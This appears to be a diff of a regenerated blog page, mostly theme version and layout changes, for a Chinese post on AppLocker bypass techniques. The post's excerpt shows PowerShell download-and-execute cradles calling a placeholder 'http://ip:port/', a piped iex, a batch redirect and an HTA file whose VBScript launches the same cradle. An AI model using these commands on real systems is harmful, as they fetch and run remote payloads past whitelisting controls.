@@ -56,16 +56,16 @@
 
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
 
-<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=7.0.1">
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.0.1">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.0.1">
 
 
 
@@ -87,8 +87,10 @@
   var CONFIG = {
     root: '/',
     scheme: 'Pisces',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
     lazyload: true,
@@ -111,7 +113,7 @@
 
 
   <meta name="description" content="from:https://www.youtube.com/watch?v=z04NXAkhI4k 0x00 Command 和 Powershell 没被禁用，脚本被禁用 1、直接使用cmd powershell执行Powershell:1IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;) Command：1power">
-<meta name="keywords" content="applocker,bypass">
+<meta name="keywords" content="bypass,applocker">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AppLocker Bypass Techniques">
 <meta property="og:url" content="https://evi1cg.github.io/archives/AppLocker_Bypass_Techniques.html">
@@ -158,14 +160,6 @@
 
 
 
-
-  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'UA-132188022-1');
-  </script>
 
 
 
@@ -503,8 +497,9 @@
                   <i class="fa fa-comment-o"></i>
                 </span>
             
+                <span class="post-meta-item-text">评论数：</span>
                 <a href="/archives/AppLocker_Bypass_Techniques.html#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/AppLocker_Bypass_Techniques.html" itemprop="commentCount"></span>
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/AppLocker_Bypass_Techniques.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -537,7 +532,7 @@
 <h2 id="0x00-Command-和-Powershell-没被禁用，脚本被禁用"><a href="#0x00-Command-和-Powershell-没被禁用，脚本被禁用" class="headerlink" title="0x00 Command 和 Powershell 没被禁用，脚本被禁用"></a>0x00 Command 和 Powershell 没被禁用，脚本被禁用</h2><p><img src="https://evi1cg.github.io/usr/uploads/2016/12/1846475534.png" alt="1463634732723.png"></p>
 <h3 id="1、直接使用cmd-powershell执行"><a href="#1、直接使用cmd-powershell执行" class="headerlink" title="1、直接使用cmd powershell执行"></a>1、直接使用cmd powershell执行</h3><p>Powershell:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">'http://ip:port/'</span>)</span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -c IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString('http:<span class="comment">//ip:port/')</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content script.ps1 <span class="string">| iex</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> script.ps1 | iex</span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span>.<span class="bash">exe /K &lt; payload.bat</span></span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <h3 id="3、hta"><a href="#3、hta" class="headerlink" title="3、hta"></a>3、hta</h3><p>payload.hta<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"VBScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">Set</span> objShell = CreateObject(<span class="string">"Wscript.Shell"</span>)</span></span><br><span class="line"><span class="actionscript">    objShell.Run <span class="string">"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
@@ -611,6 +606,7 @@
 
 
 
+
   
 
 
@@ -634,9 +630,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/applocker/" rel="tag"># applocker</a>
-          
             <a href="/tags/bypass/" rel="tag"># bypass</a>
+          
+            <a href="/tags/applocker/" rel="tag"># applocker</a>
           
         </div>
       
@@ -712,7 +708,6 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
-    
     <div class="sidebar-inner">
 
       
@@ -737,7 +732,7 @@
             
             </a>
               <p class="site-author-name" itemprop="name">Evi1cg</p>
-              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+              <div class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</div>
           </div>
 
           
@@ -757,7 +752,11 @@
                 
                 
                 <div class="site-state-item site-state-categories">
-                  <a href="/categories/index.html">
+                  
+                    
+                      <a href="/categories">
+                    
+                  
                     
                     
                       
@@ -784,7 +783,11 @@
                 
                 
                 <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
+                  
+                    
+                      <a href="/tags">
+                    
+                  
                     
                     
                       
@@ -909,54 +912,6 @@
           
 
           
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
-                </span>
-              
-            </div>
-          
 
           
 
@@ -1020,6 +975,7 @@ show_date_time();
     </div>
     <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
   </aside>
+  
 
 
         
@@ -1063,8 +1019,6 @@ show_date_time();
     
       <div class="back-to-top">
         <i class="fa fa-arrow-up"></i>
-        
-          <span id="scrollpercent"><span>0</span>%</span>
         
       </div>
     
@@ -1137,35 +1091,35 @@ show_date_time();
   
 
 
-  <script src="/js/src/utils.js?v=6.7.0"></script>
+  <script src="/js/src/utils.js?v=7.0.1"></script>
 
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/affix.js?v=6.7.0"></script>
-
-  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+  <script src="/js/src/motion.js?v=7.0.1"></script>
 
 
 
   
-  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
-<script src="/js/src/post-details.js?v=6.7.0"></script>
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
 
 
 
   
 
 
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
 
 
-
+  
   
   
 
@@ -1212,7 +1166,6 @@ show_date_time();
 
 
   
-
   <script>
     // Popup Window;
     var isfetched = false;
@@ -1542,24 +1495,21 @@ show_date_time();
   
 
   
+
+  
+
+  
   <script>
     (function(){
       var bp = document.createElement('script');
       var curProtocol = window.location.protocol.split(':')[0];
-      if (curProtocol === 'https') {
-        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
-      }
-      else {
-        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-      }
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(bp, s);
     })();
   </script>
 
 
-
-  
 
   
 
@@ -1587,10 +1537,12 @@ show_date_time();
       white-space: nowrap;
       vertical-align: middle;
       cursor: pointer;
-      background-color: #eee;
-      background-image: linear-gradient(#fcfcfc, #eee);
-      border: 1px solid #d5d5d5;
-      border-radius: 3px;
+      
+        background-color: #eee;
+        background-image: linear-gradient(#fcfcfc, #eee);
+        border: 1px solid #d5d5d5;
+        border-radius: 3px;
+      
       user-select: none;
       outline: 0;
     }
@@ -1600,13 +1552,15 @@ show_date_time();
       opacity: 0;
       padding: 2px 6px;
       position: absolute;
-      right: 4px;
-      top: 8px;
+      
+        right: 4px;
+        top: 8px;
+      
     }
 
     .highlight-wrap:hover .copy-btn,
     .highlight-wrap .copy-btn:focus {
-      opacity: 1
+      opacity: 1;
     }
 
     .highlight-wrap {
@@ -1622,27 +1576,22 @@ show_date_time();
           return $(e).text();
         }).toArray().join('\n');
         var ta = document.createElement('textarea');
-        var range = document.createRange(); //For Chrome
-        var sel = window.getSelection(); //For Chrome
         var yPosition = window.pageYOffset || document.documentElement.scrollTop;
-        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.top = yPosition + 'px'; // Prevent page scroll
         ta.style.position = 'absolute';
         ta.style.opacity = '0';
+        ta.readOnly = true;
         ta.value = code;
-        ta.textContent = code; //For FireFox
-        ta.contentEditable = true;
-        ta.readOnly = false;
         document.body.appendChild(ta);
-        range.selectNode(ta);
-        sel.removeAllRanges();
-        sel.addRange(range);
+        ta.select();
         ta.setSelectionRange(0, code.length);
+        ta.readOnly = false;
         var result = document.execCommand('copy');
         
           if (result) $(this).text('复制成功');
           else $(this).text('复制失败');
         
-        ta.blur(); //For iOS
+        ta.blur(); // For iOS
         $(this).blur();
       })).on('mouseleave', function(e) {
         var $b = $(this).find('.copy-btn');
